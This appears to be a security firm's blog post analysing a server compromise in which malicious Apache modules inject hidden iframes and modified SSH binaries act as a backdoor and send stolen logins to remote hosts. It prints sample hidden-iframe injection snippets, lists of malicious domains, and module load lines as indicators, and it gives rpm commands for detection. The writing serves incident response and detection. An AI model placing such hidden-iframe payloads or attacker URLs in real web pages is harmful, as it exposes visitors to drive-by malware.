@@ -1,0 +1,91 @@
+Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor
+
+There are many ways to inject a malicious payload onto a website. The attacker can modify any of the web files (index.php for example), the .htaccess file or php.ini (if the site is using PHP). There are other ways, but those are the most common methods, specially on shared hosts.
+However, for the last year, we started to see a new way to inject malware on compromised servers via a malicious Apache module. We posted about it before and it has been covered on many other mediums. After a few months of tracking them, and working on multiple servers that had this issue, we want to share a bit of what we have learned.
+Identifying the injection
+First, a good way to identify if an infection is coming via the Apache module compromise is by looking at how the iframe is being inserted. They seem to always follow this pattern:
+
+<style<.t1nhuhjv { position:absolute; left:-1619px; top:-1270px} </style> <div class=”t1nhuhjv”><iframe
+src="httx://qotive. changeip.name/random/" width=”534″ height=”556″> </iframe></div>
+or
+<style>.q6umct6stl { position:absolute; left:-1284px; top:-1774px} </style> <div class="q6umct6stl”><iframe
+src="httx://nujifa. longmusic.com/kdqjagzxwbakl/cdce48ffcf125f41206a9ed88675b56b/" width="367" height="411"></iframe></div>
+
+The domain name changes very often (IP is often 62.75.235.48), as does the div class name and the iframe sizes. These are some of the domains we have tracked:
+
+http://mailboxworkssli.com/?a=YWZmaWQ9MDE3ODg=
+http://versusboxmask.info/?a=YWZmaWQ9MDE3ODg=
+http://magicsstolens.info/?a=YWZmaWQ9MDE3ODg=
+http://servershosstfrienduns.net/?a=YWZmaWQ9MDE3ODg=
+http://computershosstbrouns.com/?a=YWZmaWQ9MDE3ODg=
+http://namesstillsleags.net/?a=YWZmaWQ9MDE3ODg=
+http://sitesstillsleags.net/?a=YWZmaWQ9MDE3ODg=
+http://carssubjectchoicechips.net/?a=YWZmaWQ9MDE3ODg=
+http://sitesellingsappfourd.net/?a=YWZmaWQ9MDE3ODg=
+http://orlandoslimbigs.net/?a=YWZmaWQ9MDE3ODg=
+http://spellingtells.net/?a=YWZmaWQ9MDE3ODg=
+http://domainsrandomsswopp.net/?a=YWZmaWQ9MDE3ODg=
+http://adeptsponsorlin.info/?a=YWZmaWQ9MDE3ODg=
+http://domainssinglsnetss.info/?a=YWZmaWQ9MDE3ODg=
+
+or
+
+http://rulanife.longmusic.com/tc0kvqzxw8tplc/afee21e0c3a4cf80bc3255202a0739a7/ (62.75.235.48)
+http://nujifa.longmusic.com/kdqjagzxwbakl/cdce48ffcf125f41206a9ed88675b56b/ (62.75.235.48)
+http://zoreqa.changeip.name/koqfazzxwr2w245zl/afee21e0c3a4cf80bc3255202a0739a7/ (62.75.235.48)
+http://wewezo.changeip.name/gg8nq3zxwzyacky/affe21e0c3a4cf80bc3255202a0739a7 (62.75.235.48)
+http://powotu.longmusic.com/4ojldhzxwkfzrkb/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://bisobobuk.longmusic.com/pvnx9jzxw4pe3wzn/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://lagefoze.changeip.name/edubhlzxwjlxlfcw/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://zepuyetit.changeip.name/cxrv6hzxwecblwb8/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://cacowoj.changeip.name/efvch6zxwyuhu/b289156cca80d8546795dbf2bda7dbab/ (62.75.235.48)
+http://vunovolev.changeip.name/ogwtmkzxwfumd/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://dohana.changeip.name/iwnjvpzxwh7elk/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+http://bibepi.changeip.name/yslz6zxwkents/e935dcd5a72531f51b5ee69f465ce860/ (62.75.235.48)
+
+Early on they were using .net’s and .info’s domains and recently switched to using domains from Change IP (changeip.name, longmusic.com and others). Another interesting point is that since .co.cc was disabled, we have started seeing many attacks using Change IP: http://labs.sucuri.net/?note=2012-12-10.
+Apache Module
+The attackers are modifying the httpd.conf file (or any configuration file inside /etc/httpd/conf.d) and insert a line to inject their own modules:
+
+LoadModule pool_mem_module /lib64/libwutfa.so.2
+or
+LoadModule bench_proxy_module /lib64/libhdast.so.1
+or
+LoadModule string_log_module /usr/lib/libcehf.so.7
+
+The module names and location are pretty random and their md5 checksums also seems to change often:
+
+6b704ca7d3454830d212c88ffd6250c0
+61051d0d1c7bdc109aa27732b94c94c0
+82b0da95b511cdd02b377072b4fcada7
+
+However, once loaded, they inject an iframe at the top of the site once per day per IP address and only to certain user agents. That makes discovering and tracking the malware much more difficult.
+Dennis (from Unmaskparasites) was able to find the source code for these modules, and posted on his blog: Malicious Apache Module Injects Iframes, so we won’t go into more unnecessary details here as he covered it very well.
+A good way to identify if you have any non standard module is by running the rpm command and checking the integrity of the files:
+
+# rpm -qf /lib64/*
+# rpm -qf /usr/lib/*
+# rpm -qf /etc/httpd/modules/*
+
+If you find any module that is not part of any package (not owned by anyone), it is a good red flag that this module was added by the attackers.
+SSHD binary
+Another part of the compromise that we haven’t seen mentioned anywhere else is how the attackers keep access to the owned servers. We have noticed that they are modifying all SSH binaries and inserted a version that gives them full access back to the server. The modifications not only allow them to remote into the server bypassing existing authentication controls, but also allow them to steal all SSH authentications and push it to their remote servers.
+A good way to identify this is to run the rpm -Va command to see all file changes. If SSHD has been modified, you would see this error:
+
+S.5……    /usr/bin/scp
+S.5……    /usr/bin/sftp
+S.5……    /usr/bin/ssh
+S.5……    /usr/bin/sshd
+S.5……    /usr/bin/ssh-add
+S.5……    /usr/bin/ssh-keyscan
+S.5……    /usr/bin/ssh-keygen
+
+We ran the sshd binary through virus total and 0 (none) out of 46 anti virus engines flagged it: https://www.virustotal.com/file/ebfd9354ed83635ed38bd117b375903f9984a18780ef86dbf7a642fc6584271c/analysis/1357925310/
+We were not able to fully inspect the modified SSH binaries yet, but it seems to do 2 things:
+
+Every time some one logins to the server, it sends the host/user/pass to openssh.info or linuxrepository.org.
+Every time someone uses the ssh binary, it also sends the host/user/pass to openssh.info.
+
+Allowing them to maintain their access and spread to other servers that are accessed from the compromised box.
+Conclusion
+We are still tracking and monitoring this type of infection, so expect more updates soon. If you have any details to share, please let us know.
